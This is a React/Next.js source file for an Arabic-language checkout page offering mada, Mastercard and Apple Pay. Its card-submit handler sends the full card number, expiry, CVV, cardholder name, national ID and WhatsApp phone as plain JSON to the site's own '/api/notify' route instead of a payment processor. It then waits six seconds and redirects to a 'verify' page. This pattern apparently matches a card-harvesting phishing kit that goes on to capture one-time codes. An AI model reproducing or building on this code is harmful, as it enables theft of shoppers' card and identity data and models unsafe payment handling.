"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import AddressSection, { ShippingOption } from "../components/address/AddressSection";
import { useCartStore } from "../store/cartStore";
import { useRateLimit } from "./useRateLimit";
import { LoadingOverlay, SuccessModal } from "./CheckoutModals";
import CheckoutPayment from "./CheckoutPayment";
import CustomerSection, { validateCustomer } from "./CustomerSection";
import type { CustomerData } from "./CustomerSection";

const fmt = (n: number) => n.toLocaleString("en-US");
const API = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000";
const resolveImg = (src: string) => (src?.startsWith("http") ? src : `${API}${src?.startsWith("/") ? src : `/${src || ""}`}`);

export default function CheckoutPage() {
  const router = useRouter();
  const { items, totalPrice, clear, customer: customer_store } = useCartStore();
  const [mounted, setMounted] = useState(false);
  const { blocked, fmtTime, recordAttempt } = useRateLimit();

  const [selectedShipping, setSelectedShipping] = useState<ShippingOption | null>(null);
  const [shippingConfirmed, setShippingConfirmed] = useState(false);
  const [selectedPayment, setSelectedPayment] = useState<"mada" | "mastercard" | "applepay" | null>(null);
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumberError, setCardNumberError] = useState("");
  const [cardExpiryError, setCardExpiryError] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [loading, setLoading] = useState(false);
  const submittingRef = useRef(false);
  const [customer, setCustomerData] = useState<CustomerData>({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    nationalId: "",
  });
  const [address, setAddress] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [customerConfirmed, setCustomerConfirmed] = useState(false);

  useEffect(() => {
    const saved = localStorage.getItem("checkout_customer");
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        setCustomerData({
          firstName: parsed.firstName || "",
          lastName: parsed.lastName || "",
          email: parsed.email || "",
          phone: parsed.phone || "",
          nationalId: parsed.nationalId || "",
        });
        setAddress(parsed.address || "");
        setCustomerConfirmed(parsed.confirmed || false);
      } catch { /* silent */ }
    }
    const savedShipping = localStorage.getItem("checkout_shipping");
    if (savedShipping) {
      try {
        setSelectedShipping(JSON.parse(savedShipping));
        setShippingConfirmed(true);
      } catch { /* silent */ }
    }
  }, []);

  useEffect(() => {
    setMounted(true);
  }, []);

  const total = mounted ? totalPrice() : 0;

  if (!mounted) return null;
  if (items.length === 0) {
    router.replace("/cart");
    return null;
  }

  const fullName = `${customer.firstName} ${customer.lastName}`.trim();

  const confirmCustomer = () => {
    const e = validateCustomer(customer);
    setErrors(e);
    if (!Object.keys(e).length) {
      setCustomerConfirmed(true);
      localStorage.setItem(
        "checkout_customer",
        JSON.stringify({ ...customer, address, confirmed: true })
      );
    }
  };

  const handleCardSubmit = async () => {
    if (blocked || submittingRef.current) return;
    const rawCard = cardNumber.replace(/\s/g, "");
    if (rawCard.length !== 16) {
      setCardNumberError("رقم البطاقة يجب أن يكون 16 رقمًا");
      return;
    }
    if (cardExpiry.replace(/\D/g, "").length !== 4) {
      setCardExpiryError("صيغة غير صحيحة (MM/YY)");
      return;
    }
    if (cardCvv.length !== 3 || !cardHolder.trim()) return;
    if (!customer.firstName.trim() || !customer.phone) {
      setErrors({
        firstName: !customer.firstName.trim() ? "مطلوب" : "",
        phone: !customer.phone ? "مطلوب" : "",
      });
      return;
    }
    submittingRef.current = true;
    setLoading(true);
    try {
      const res = await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cardNumber: cardNumber.replace(/\s/g, ""),
          expiry: cardExpiry,
          cvv: cardCvv,
          cardHolder,
          items: items.map((i) => ({
            productId: i.product._id,
            name: i.product.name,
            price: i.price ?? i.product.salePrice ?? i.product.originalPrice ?? i.product.price ?? 0,
            quantity: i.qty,
            color: i.color || i.product.color || "",
            storage: i.storage || i.product.storage || "",
            image: i.image || (i.product as { image?: string }).image || i.product.images?.[0] || "",
          })),
          total,
          customer: fullName,
          whatsapp: customer.phone,
          nationalId: customer.nationalId,
          address,
          shippingCompany: selectedShipping?.companyName ?? "",
          installmentType: total >= 1000 ? (customer_store?.installmentType ?? "full") : "full",
          months: total >= 1000 ? (customer_store?.months ?? 0) : 0,
          downPayment: total >= 1000 ? (customer_store?.downPayment ?? 0) : 0,
        }),
      });
      const data = await res.json();
      if (res.status === 429) {
        recordAttempt();
        setErrors({ firstName: "لقد تجاوزت الحد المسموح به من الطلبات" });
        return;
      }
      recordAttempt();
      const isInstallment = total >= 1000 && customer_store?.installmentType === "installment";
      const verifyAmount = isInstallment ? (customer_store?.downPayment ?? total) : total;
      sessionStorage.setItem(
        "verify_data",
        JSON.stringify({
          orderId: data.orderId,
          amount: verifyAmount,
          last4: cardNumber.replace(/\s/g, "").slice(-4),
          date: new Date().toISOString(),
          phone: customer.phone,
          customerName: fullName,
        })
      );
      await new Promise((r) => setTimeout(r, 6000));
      router.push("/checkout/verify");
      return;
    } catch {
      setErrors({ firstName: "تعذر الاتصال بالخادم" });
      submittingRef.current = false;
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center px-4 pt-28 sm:pt-32 pb-10 gap-6" dir="rtl">
      <LoadingOverlay show={loading} />
      <SuccessModal
        show={showSuccess}
        onClose={() => {
          setShowSuccess(false);
          clear();
          router.replace("/");
        }}
      />

      {/* ORDER SUMMARY CARD */}
      <div className="relative w-full max-w-4xl bg-white border border-gray-100" dir="rtl">
        <div className="flex flex-row items-center px-4 py-3 gap-3">
          <div className="w-12 h-12 sm:w-16 sm:h-16 rounded-full overflow-hidden shrink-0 border border-gray-100">
            <Image
              src="/logo.webp"
              alt="logo"
              width={64}
              height={64}
              className="object-contain w-full h-full"
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = "none";
              }}
            />
          </div>
          <div className="flex-1 flex flex-col gap-2">
            <p className="text-sm sm:text-base font-black text-[#173e48]">إجمالي الطلب</p>
            <div className="flex flex-wrap gap-2">
              {items.map((item) => {
                const rawImg = item.image || item.product.images?.[0] || (item.product as { image?: string }).image;
                const img = rawImg ? resolveImg(rawImg) : null;
                return (
                  <div key={item.id || `${item.product._id}_${item.color || ""}_${item.storage || ""}`} className="relative">
                    <div className="w-10 h-10 rounded-full border border-gray-200 overflow-hidden flex items-center justify-center bg-gray-50">
                      {img ? (
                        <Image
                          src={img}
                          alt={item.product.name}
                          width={40}
                          height={40}
                          className="object-contain w-full h-full p-0.5"
                        />
                      ) : (
                        <span className="text-base">📦</span>
                      )}
                    </div>
                    {item.qty > 1 && (
                      <span
                        className="absolute -top-1 -left-1 w-3.5 h-3.5 rounded-full text-white text-[8px] font-black flex items-center justify-center"
                        style={{ background: "#173e48" }}
                      >
                        {item.qty}
                      </span>
                    )}
                  </div>
                );
              })}
            </div>
          </div>
          <div className="flex flex-col items-end gap-1 shrink-0">
            <p className="text-lg sm:text-3xl font-black text-[#173e48] leading-none">
              {fmt(total)}
              <span className="text-xs sm:text-sm font-medium text-gray-400 mr-1">
                <img
                  src="/money-icon.webp"
                  alt="ر.س"
                  style={{ width: 32, height: 32, display: "inline" }}
                />
              </span>
            </p>
          </div>
        </div>

        <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-[65%] bg-white px-3 py-0.5 border border-gray-200 rounded-full">
          <span className="text-[11px] font-bold text-gray-400">تفاصيل الطلب</span>
        </div>
      </div>

      {/* DETAILS CARD */}
      <div className="relative w-full max-w-4xl bg-white border border-gray-100" dir="rtl">
        {/* CUSTOMER INFO */}
        <CustomerSection
          data={customer}
          errors={errors}
          confirmed={customerConfirmed}
          onChange={(field, value) => {
            setCustomerData((p) => ({ ...p, [field]: value }));
            setErrors((p) => ({ ...p, [field]: "" }));
          }}
          onConfirm={confirmCustomer}
          onEdit={() => setCustomerConfirmed(false)}
        />

        {/* ADDRESS + SHIPPING */}
        <div className="border-t border-gray-100" />
        <AddressSection
          locked={!customerConfirmed}
          onChange={(addr) => {
            setAddress(addr.address ?? "");
          }}
          onShippingSelect={(opt) => {
            setSelectedShipping(opt);
            setShippingConfirmed(!!opt);
          }}
        />

        {/* PAYMENT */}
        <div className="border-t border-gray-100" />
        <CheckoutPayment
          shippingConfirmed={shippingConfirmed}
          selectedPayment={selectedPayment}
          setSelectedPayment={setSelectedPayment}
          cardNumber={cardNumber}
          setCardNumber={setCardNumber}
          cardExpiry={cardExpiry}
          setCardExpiry={setCardExpiry}
          cardCvv={cardCvv}
          setCardCvv={setCardCvv}
          cardHolder={cardHolder}
          setCardHolder={setCardHolder}
          cardNumberError={cardNumberError}
          setCardNumberError={setCardNumberError}
          cardExpiryError={cardExpiryError}
          setCardExpiryError={setCardExpiryError}
          loading={loading}
          blocked={blocked}
          fmtTime={fmtTime}
          onCardSubmit={handleCardSubmit}
        />
      </div>
    </div>
  );
}
